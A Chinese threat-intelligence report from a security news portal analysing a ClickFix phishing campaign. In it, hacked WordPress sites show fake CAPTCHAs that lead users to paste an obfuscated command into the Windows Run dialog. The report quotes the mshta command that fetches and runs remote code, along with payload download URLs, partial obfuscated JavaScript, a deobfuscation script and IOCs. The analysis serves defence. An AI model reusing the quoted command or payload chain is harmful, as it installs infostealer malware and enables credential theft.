---
title: 验证码对抗之殇：Clickfix最新钓鱼事件分析报告
url: https://www.freebuf.com/articles/paper/420320.html
source: FreeBuf网络安全行业门户
date: 2025-01-21
fetch_date: 2025-10-06T20:10:13.639224
---

# 验证码对抗之殇：Clickfix最新钓鱼事件分析报告

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

验证码对抗之殇：Clickfix最新钓鱼事件分析报告

* ![]()
* 关注

* [咨询](https://www.freebuf.com/consult)

验证码对抗之殇：Clickfix最新钓鱼事件分析报告

2025-01-20 16:32:27

所属地 上海

曾几何时，验证码是横亘在人与机器之间的那道数字藩篱，以看似简单的交互，守护着虚拟世界的秩序。然而，当人工智能的浪潮席卷而来，昔日泾渭分明的界限开始变得模糊不清。黑产团伙敏锐地捕捉到这种变化带来的“信任错位”，他们洞悉用户对日渐繁琐验证机制的疲惫与麻木，精心编织出一张名为“Clickfix”的钓鱼之网。这项最早于2024年5月浮出水面的技法，历经短短半年的演变，已蜕变成一套复杂而成熟的攻击体系，其背后的深思熟虑，令人警惕。

2024年12月，腾讯云安全科恩实验室威胁情报中心捕获到了多起国外黑灰产团伙通过Clickfix社会工程学钓鱼手法对windows系统用户进行攻击的事件。

## 1.攻击主要特征

观察到的攻击活动通常利用伪造的交互式页面，模拟如Google Meet 或reCaptcha 等常用服务，诱导用户执行一系列操作，从而实现恶意代码的传播和执行。攻击流程的关键步骤如下：

1. 攻击者首先会部署精心设计的钓鱼页面，这些页面会伪装成合法的服务界面。随后，页面会弹出虚假的验证码窗口，或伪造需要修复软件的告警提示。这些提示通常包含一个诱导性的“下一步”按钮。当受害者点击该按钮时，会触发页面内置的恶意JavaScript 代码。这段代码的核心功能是将一段经过精心构造的恶意payload 复制到用户的系统剪贴板中。此步骤旨在为后续的命令注入做好准备。
2. 页面紧接着会引导受害者按下“Win + R” 组合键，这在Windows 系统中是打开“运行”对话框的快捷键。此步骤旨在为后续命令执行提供入口。
3. 之后，页面会指示受害者按下“Ctrl + V” 组合键。该组合键用于粘贴剪贴板中的内容，即将之前复制的恶意payload 粘贴到“运行”对话框中。此步骤是利用用户对快捷键的熟悉程度，降低用户警惕性。
4. 最后，受害者被要求按下Enter 键，这将触发执行先前粘贴到“运行”对话框中的恶意payload。该payload 通常是经过混淆的PowerShell 或mshta 命令，这些命令负责从远程服务器下载恶意脚本，并在受害者的系统中执行。此步骤是攻击链的最终阶段，也是恶意代码真正发挥作用的环节。

![](https://image.3001.net/images/20250120/1737361979_678e0a3bd5032fa440e34.png!small)

下图为黑产团伙实施攻击的完整流程，该流程可分为三个主要阶段：

1. 初始访问与恶意代码注入：黑产团伙首先利用漏洞（如Web 应用漏洞、插件漏洞等）或弱口令爆破等手段，非法获取大量WordPress 网站的控制权限。随后，攻击者会在这些被攻陷的网站上注入恶意的JavaScript 代码。此阶段是攻击链的初始环节，为后续的攻击活动提供了立足点。
2. 用户诱导与恶意命令执行：当用户正常访问已被投毒的网站时，嵌入的恶意JavaScript 代码会被触发。该代码会伪造一个虚假的验证码程序（例如模仿reCaptcha 等），诱导用户执行一系列操作，最终目的是让用户主动执行剪贴板中预先复制的恶意命令。此阶段利用了社会工程学技巧，诱使用户成为攻击的执行者。
3. 下载与数据窃取：一旦用户执行了恶意命令，其计算机就会从黑产团伙控制的远程服务器下载恶意后门程序。该后门程序会在受害者的设备上潜伏，收集包括但不限于设备信息、浏览器历史、cookie、用户凭据等敏感信息，并将这些数据回传到攻击者控制的服务器。此阶段是攻击链的最终阶段，旨在窃取用户敏感信息，实现攻击者的非法目的。

![](https://image.3001.net/images/20250120/1737362015_678e0a5f18e5a23621518.png!small)

## 2.溯源分析

### 2.1.钓鱼场景布置

攻击者在实施本次钓鱼攻击活动中展现了高度的专业性和对抗性。以下将通过具体案例分析，深入剖析攻击者所采用的技战术。

某国内传媒企业网站（http://www[.]u-xxx.cn/）基于WordPress 系统搭建。在访问该网站时，用户会遭遇弹出的伪造验证码窗口。通过审查网站源代码（F12），可定位到被注入的恶意JavaScript 代码。值得注意的是，攻击者并未采用script src="..." 标签加载外部恶意脚本的方式，此举增加了检测的难度。

![](https://image.3001.net/images/20250120/1737362041_678e0a791a8066437a7ea.png!small)

经过Base64 解码后，可还原恶意JavaScript 代码。代码片段显示，其逻辑涉及从Binance Smart Chain (BSC) 链RPC 节点获取数据。

![](https://image.3001.net/images/20250120/1737362070_678e0a965c555544eb173.png!small)

通过分析网络行为，可观察到恶意脚本向https://data-seed-prebsc-1-s1[.]bnbchain[.]org:8545/ 发送请求，此为币安链的RPC 节点。攻击者通过该请求获取后续恶意代码。他们将恶意代码存储于智能合约，以此规避传统的威胁情报拦截措施。此外，智能合约的去中心化特性也使其难以被单点清除。

![](https://image.3001.net/images/20250120/1737362096_678e0ab064b4bcc98d127.png!small)

涉及的智能合约地址：

l0x80d31D935f0EC978253A26D48B5593599B9542C7

l0x7d0b5A06F8c43011fB66Eb90f61525A827eaE0d7

**2.1.1.小结**

#### 结合上述规则，我们总结出FOFA测绘特征查询语句如下：

攻击者利用插件漏洞或弱口令等手段，获取大量WordPress 网站的控制权限，并通过硬编码Base64 编码的恶意JavaScript 代码，植入第一阶段的恶意载荷。

第一阶段恶意代码执行后，会向BSC 区块链上的恶意智能合约地址发起请求，获取最新的第二阶段钓鱼代码内容。智能合约的去中心化和不可篡改特性延长了恶意代码的存活周期。

浏览器运行第二阶段恶意代码后，弹出伪造的验证码窗口，诱导用户执行恶意操作。

结合上述规则，我们总结出FOFA测绘特征查询语句如下：

> body="<script id=\"sjc\""

在2025年1月的时间点，全网有超过700个受害网站被植入了钓鱼恶意代码。

![](https://image.3001.net/images/20250120/1737362141_678e0add04de079419e46.png!small)

### 2.2.恶意代码执行

在诱导用户执行恶意代码成功后，黑产团伙为了提升攻击的成功率，大量利用了混淆技术，下面是自动复制到用户剪贴板，诱导用户执行的恶意命令：

> mshta https://solve.vwglq.com/awjxs.captcha?u=0608f4ba-cf75-41b2-ab6f-ba4a4aea199a # ✅ ''I am not a robot - reCAPTCHA Verification ID: 5006''

该命令利用mshta加载远程的恶意代码，url通过cdn转发跳转到https://deduhko2[.]kliphuwatey[.]shop/Poket.mp4 （MD5：9fb3db7b334f385701b3c88d63b7e5ee ）执行恶意代码。

9fb3db7b334f385701b3c88d63b7e5ee是一个高度混淆的恶意代码文件，首先通过.mp4后缀名来逃避检测。其次该文件利用hta程序执行的特征，往有效的script标签之间塞入大量的垃圾数据躲避检测。我们编写了以下的反混淆脚本来还原恶意代码：

> import re
>
> f = open("658d84007977b9bcbac196d09ec012e15dba6d71f026613bb08e3a0ec4aceef8", "rb")
>
> data = f.read()
>
> pattern = re.compile(b'<script>(.\*?)</script>', re.DOTALL)
>
> scripts = pattern.findall(data)
>
> defdeobfuscate\_payload1(AzCWm):
>
> # Extract substring
>
> cJvxP = AzCWm[27:61047]
>
> # Process hex pairs
>
> decoded = ''
>
> for i inrange(0, len(cJvxP), 3):
>
> if i + 2 <= len(cJvxP):
>
> hex\_pair = cJvxP[i:i+2]
>
> try:
>
> # Convert hex to ASCII
>
> char = chr(int(hex\_pair, 16))
>
> decoded += char
>
> except ValueError:
>
> continue
>
> return decoded
>
> result = deobfuscate\_payload1(data)
>
> print(result)

还原后的代码依然是高度混淆的，通过javascript的String.fromCharCode编码技巧来隐藏恶意代码躲避检测。

> window.moveTo(9999,0)
>
> window.onerror = function(){returntrue}
>
> varAzCWm = document.documentElement.outerHTML;
>
> var cJvxP = AzCWm.substring(27 , 61047);
>
> eval(cJvxP.replace(/(..)./g, function(match, p1) {returnString.fromCharCode(parseInt(p1, 16))}))
>
> AzCWm(ilcMIc){var cJvxP= '';for (varOkbNpV = 0;OkbNpV < ilcMIc.length; OkbNpV++){varHcWCG = String.fromCharCode(ilcMIc[OkbNpV] - 395);cJvxP = cJvxP + HcWCG}return cJvxP};var cJvxP = AzCWm([507,506,514,496,509,510,499,496,503,503,441,496,515,496,427,440,514,427,444,427,440,496,507...

这段javascript的作用是通过执行powershell来加载下一阶段的恶意代码。为了自动化提取去混淆后的恶意代码，我们可以使用腾讯云安全威胁情报中心官网[https://**tix.qq.com**](https://tix.qq.com/)提供的“文件沙箱”功能，将Poket.mp4的后缀名改成.hta以后，投递到“文件沙箱”，我们可以观察到Att&ck行为规则命中的高危行为，其中正是执行的powershell恶意命令，从https://deduhko[.]klipzyroloo[.]shop/mazkk.eml下载到下一阶段的恶意代码。

![](https://image.3001.net/images/20250120/1737362179_678e0b03e7faa8ae716d4.png!small)

makk.eml 仍然是高度混淆的powershell恶意代码，通过“文件沙箱”的网络抓包能力，我们能够提取到makk.eml执行后的请求，以及下一阶段的exe恶意程序。

![](https://image.3001.net/images/20250120/1737362206_678e0b1e96ac40ae3ce36.png!small)

makk.eml执行后会上报受害者机器的信息，并从https://klipvumisui[.]shop/int\_clp\_sha.txt下载到最终的后门程序，经过腾讯安全恶意文件分析平台（云查）鉴定，该文件属于HijackLoader变种，后续用于加载Lumma Stealer后门程序。

#### **2.2.1.小结**

用户被诱导执行恶意命令后，会触发4阶段的连锁反应，每阶段运行的恶意代码都经过高度混淆且设置了多重逃避检测机制，最后植入后门程序盗取用户敏感信息。

![](https://image.3001.net/images/20250120/1737362238_678e0b3e2742c2d90a43b.png!small)

## 3.总结

ClickFix背后的攻击者不仅在社会工程学技巧上表现出高度的专业化，巧妙地利用用户对常见验证机制的信任，更创新性地利用区块链技术的去中心化特性来躲避传统安全防护的检测，延长恶意代码的存活周期。攻击链条中的多阶段恶意代码下载，以及对恶意代码的层层混淆，都显著增加了分析溯源的难度，凸显了黑产团伙攻击手法的复杂性和隐蔽性。

腾讯云安全威胁情报团队作出以下呼吁来防范该类新型攻击：

1.警惕所有提示进行快捷键操作的弹窗信息。

2.wordpress网站管理员加强对网站的安全管理，设置强密码，禁用可疑插件。

3.下载“腾讯电脑管家(https://guanjia.qq.com/ )”，开启主动防御模块并定时查杀。

4.在安全运营流程中回扫下列关联IOC是否存在，已辅助确定是否已经出现相关威胁的干扰或已经出现失陷主机。

## 4.IOC

lsolve[.]vwglq[.]com

lsolve[.]jenj[.]org

lsolve[.]gevaq[.]com

lsolve[.]fizq[.]net

ldeduhko2[.]kliphuwatey[.]shop

ldeduhko[.]klipzyroloo[.]shop

lklipvumisui[.]shop

l9fb3db7b334f385701b3c88d63b7e5ee

l617fa9b16221e1327bf21732b3e8e568

l51f99eddd33cc04fb0f55f873b76d90

作者：腾讯云安全威胁情报中心

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

1.攻击主要特征

2.溯源分析

* 2.1.钓鱼场景布置
* 2.2.恶意代码执行

3.总结

4.IOC

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://we...